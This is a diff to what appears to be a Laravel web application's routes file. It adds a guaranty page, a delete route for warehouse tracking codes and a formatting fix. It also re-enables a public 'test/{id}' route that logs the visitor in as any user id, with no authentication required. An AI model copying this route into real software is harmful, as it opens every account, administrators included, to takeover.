@@ -70,6 +70,10 @@ use PDF as PDF;
 |
 */
 
+Route::get('guaranty', function () {
+    return view('guaranty');
+});
+
 Route::get('/', function () {
     if (Auth::check()) {
         return redirect()->to('/panel');
@@ -77,9 +81,9 @@ Route::get('/', function () {
     return view('auth.login');
 });
 
-//Route::get('test/{id}',function ($id){
-//     return auth()->loginUsingId($id);
-//});
+Route::get('test/{id}', function ($id) {
+    return auth()->loginUsingId($id);
+});
 
 
 Route::get('/label/generator', function () {
@@ -141,10 +145,11 @@ Route::middleware(['auth', 'web'])->prefix('/panel')->group(function () {
     //Transfer
     Route::resource('transfers', TransferController::class)->except('show');
     Route::get('transfers/download/{id}', [TransferController::class, 'downloadReceipt'])->name('transfers.download');
+    Route::delete('tracking-delete-code/{id}', [WarehouseController::class, 'deleteCode'])->name('tracking.deleteCode');
 
     //PreInvoice
     Route::resource('/pre-invoices', PreInvoiceController::class);
-    Route::post('/pre-invoices/print-pdf', [PreInvoiceController::class,'print'])->name('pre-invoices.print');
+    Route::post('/pre-invoices/print-pdf', [PreInvoiceController::class, 'print'])->name('pre-invoices.print');
 
     //software-update
     Route::resource('/software-update', SoftwareUpdateController::class)->except('show');
